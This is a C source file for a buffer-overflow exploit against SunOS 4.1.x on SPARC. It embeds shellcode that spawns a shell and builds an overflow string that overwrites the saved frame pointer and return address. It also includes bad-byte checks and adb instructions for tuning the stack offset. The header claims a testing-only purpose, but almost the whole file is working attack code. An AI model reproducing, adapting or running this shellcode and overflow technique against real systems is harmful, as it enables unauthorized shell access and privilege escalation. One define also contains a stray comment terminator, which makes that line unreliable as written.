/********************************************************************
  Exploit to test buffer overflows on SunOs 4.1.x
  This program generates on its output a portion of code that
  executes a shell when overflowing a buffer in a stack.
  It is parametrable and contains warnings about forbidden
  values in the output.

  I've began to written this program after having distributed the
  'suidperl' exploit, when someone told me that the sparc's stack
  wasn't executable. I remarked that signals where handled in the
  stack so I understood it was possible to do something.

  Remember to compile it with 'gcc -O0' to prevent any optimization
  that could give a wrong stack pointer.

  I want to thank specially Joseph Zbiciak for his help by giving
  me an exploit which ran on Solaris and helped me to understand
  better sparc assembler.

  PLEASE USE THIS PROGRAM FOR TESTING PURPOSE ONLY, AND NOT FOR
  CRACKING ANY SYSTEM OF WHICH YOU ARE NOT THE MAINTAINER.

                      Willy Tarreau
                      tarreau@aemiaif.ibp.fr
		      http://www-miaif.ibp.fr/willy/
**********************************************************************/

#include <stdio.h>

#define SPARC_NOP       (0xa61cc013)*/
#define SPARC_ILL       (0xfffffff0)
#define GETCORE         (*(int *)0=0)

unsigned char main2[]=
"\xa6\x1c\xc0\x13"
"\x2d\x0b\xd8\x9a"
"\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda"
"\x90\x0b\x80\x0e"
"\x92\x03\xa0\x08"
"\x94\x1a\xc0\x0b"
"\x9c\x03\xa0\x10"
"\xec\x3b\xbf\xf0"
"\xdc\x23\xbf\xf8"
"\xc0\x23\xbf\xfc"
"\x82\x1c\xe0\x3b"
"\x91\xd4\xc0\x13"
"\xa6\x1c\xc0\x13"
"\xa6\x1c\xc0\x13";

const unsigned long get_sp(void) {
  __asm__("add %sp,0x68,%i0\n");
}

long unsigned int sp;
int delta;

/* found syscalls:
   getuid: 0x18
   execve: 0x3b
   */

int s[1024];

main(int argc, char **argv) {
  int i;
  char *c;

  int j;/* buffer size, in 32-bits words */
  sp=get_sp();
  if (argc<3) {
    fprintf(stderr,"Usage: %s buffer_length stack_offset\n",argv[0]);
    fprintf(stderr,"       example: %s 1024 -0x430\n",argv[0]);
    fprintf(stderr,"       info: SP=0x%08X\n", sp);
    exit(1);
  }
  delta=strtol(argv[2],NULL,0);
  j=(strtol(argv[1],NULL,0)+3)/4;

  fprintf(stderr,"SP=0x%08X  DELTA=0x%08X  SP+DELTA=0x%08X\n",
	  sp,delta,sp+delta);

  for (i=0;i<j+16;i++)
      s[i]=SPARC_ILL;  /* if the program bramches here,
			  we get a core with the exact branch address.
			  This helps to calculate DELTA */
  *(s+j+16)=sp;   /* replaces main's %fp. Doesn't matter very much */
  *(s+j+17)=sp+delta;  /* replaces main's %i7 (return addr) */

  bcopy(main2,s+j+18,strlen(main2));
  *(c=(&s[(19+j+strlen(main2)/sizeof(int))]))=0;
  c-=4;

  while (c-->(char *)s) {
    switch(*c) {
    case 0x00 :
      fprintf(stderr,"Error: byte 0x%04X equals 0x%02X.\n"
	      "This will short the string so it will be incomplete.\n"
	      "You must change one parameter or try within a second shell.\n",
	      (int )c-(int)s,*c);
      break;
    case 0x09 :
    case 0x0a :
    case 0x0d :
    case 0x20 :
      fprintf(stderr,"Warning: byte 0x%04X equals 0x%02X\n"
	      "This can short the string so it would be incomplete.\n"
	      "You should change one parameter or try within a second shell.\n",
	      (int)c-(int)s,*c);
      break;
    }
  }
  fprintf(stderr,"strlen(s)=%d\n",strlen(s));
  fprintf(stderr,"If you get an 'illegal instruction', this is good. Run adb\n"
	  "and type '$r' to see the pc value. Then, type this value followed\n"
	  "by a slash, and search up and down instructions like:\n"
	  "0xf7fff5f0:     a61cc013        = xor           %l3, %l3, %l3\n"
	  "0xf7fff5f4:     2d0bd89a        = sethi         %hi(0x2f626800), %l6\n"
	  "and then correct the stack offset accordingly.\n");
  /*  GETCORE; */
  printf(s);
}

/* Here is the observed stack contents just after the end of a buffer. eob
   designates en first word that isn't int the buffer.
   The registers that are named here are those of the calling function.

    eob  +0 = ?
    eob  +1 = ?
%fp=eob  +2 = %l0
    eob  +3 = %l1
    eob  +4 = %l2
    eob  +5 = %l3
    eob  +6 = %l4
    eob  +7 = %l5
    eob  +8 = %l6
    eob  +9 = %l7
    eob  +a = %i0
    eob  +b = %i1
    eob  +c = %i2
    eob  +d = %i3
    eob  +e = %i4
    eob  +f = %i5
    eob +10 = %i6 = %fp
    eob +11 = %i7 = return pointer

   */

